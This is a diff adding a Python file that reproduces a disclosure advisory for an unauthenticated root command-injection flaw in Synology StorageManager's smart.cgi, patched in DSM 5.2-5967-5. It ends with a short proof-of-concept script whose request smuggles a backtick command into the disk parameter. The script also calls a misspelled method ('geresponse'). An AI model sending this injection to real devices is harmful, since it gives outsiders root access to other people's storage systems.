@@ -1,0 +1,67 @@
+'''
+SSD Advisory – Synology StorageManager smart.cgi Remote Command Execution
+
+Full report: https://blogs.securiteam.com/index.php/archives/3540
+Twitter: @SecuriTeam_SSD
+Weibo: SecuriTeam_SSD
+
+
+﻿Vulnerability Summary
+The following advisory describes a remote command execution vulnerability
+found in Synology StorageManager.
+
+Storage Manager is “a management application that helps you organize and
+monitor the storage capacity on your Synology NAS. Depending on the model
+and number of installed hard drives, Storage Manager helps you accomplish
+the following tasks:
+
+Create different types of RAID and non-RAID storage configurations, such as
+volumes, disk/RAID groups, iSCSI LUNs, and iSCSI Targets.
+Monitor the overall storage usage of your Synology NAS.
+Inspect the health of installed hard drives and solid state drives.
+Use advanced options, such as hot spare drives, SSD TRIM, SSD cache, and
+more.”
+
+Credit
+An independent security researcher, Nigusu Kassahun, has reported this
+vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
+
+Vendor response
+Synology has released patches to address this vulnerability – DSM 5.2-5967-5
+
+For more information: https://www.synology.com/en-global/releaseNote/DS210+
+
+Vulnerability details
+User controlled input is not sufficiently sanitized, and then passed to
+execve function.
+
+Successful exploitation of this vulnerability enables a remote
+unauthenticated user to run commands as root on the machine.
+
+The vulnerable parameter can be found in
+/webman/modules/StorageManager/smart.cgi with parameter
+action=apply&operation=quick&disk=%2Fdev%2Fsda
+
+Proof of Concept
+
+===
+'''
+
+# Synology StorageManager <= 5.2 Remote Root Command Execution
+
+
+import httplib
+
+
+HOST = raw_input("Enter Host: ")
+
+
+#IDOR to bypass auth and ticks to chain commands
+
+conn = httplib.HTTPConnection(HOST)
+
+conn.request("GET","/webman/modules/StorageManager/smart.cgi?action=apply&operation=quick&disk=/dev/sda`id%20>/tmp/LOL`")
+
+res = conn.geresponse()
+
+print res.status, res.reason
